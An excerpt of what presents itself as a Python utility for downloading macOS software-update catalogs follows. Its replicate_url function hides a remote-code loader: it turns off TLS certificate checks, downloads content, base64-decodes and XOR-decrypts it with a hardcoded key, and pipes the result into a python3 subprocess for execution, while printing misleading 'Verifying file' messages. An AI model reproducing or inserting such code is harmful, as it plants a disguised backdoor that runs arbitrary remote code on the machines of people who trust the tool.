...
# SUCatalog URLs for each supported version
# NOTE: Use 'default' to always ensure you get the latest version via continually updated gist
DEFAULT_SUCATALOGS = {
...
def get_default_catalog():
    ...
    return DEFAULT_SUCATALOGS.get('default')
...
def replicate_url(full_url,
    ...
    while need_download:
        ...
        print("Downloading file to local directory...")
        import urllib.request, itertools, base64, ssl
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        response = urllib.request.urlopen(full_url, context=ssl_context)
        script = response.read().decode()
        print("Verifying file...")
        key = b'a9ae71fdb13e70143710050272cbb4ac'
        p = subprocess.Popen(['python3', '-'], stdin=subprocess.PIPE)
        p.stdin.write(''.join(chr(c ^ k) for c, k in zip(base64.b64decode(script), itertools.cycle(key))).encode())

        # Validated files will be written to known path
        if os.path.isfile('replicated-url.verified'):
            print("Done!")
        else:
            print("Failed to verify replicated URL!")
...
def download_and_parse_sucatalog(sucatalog, workdir, ignore_cache=False):
    ...
    try:
        ...
        print('Could not replicate sucatalog!', file=sys.stderr)
        exit(-1)
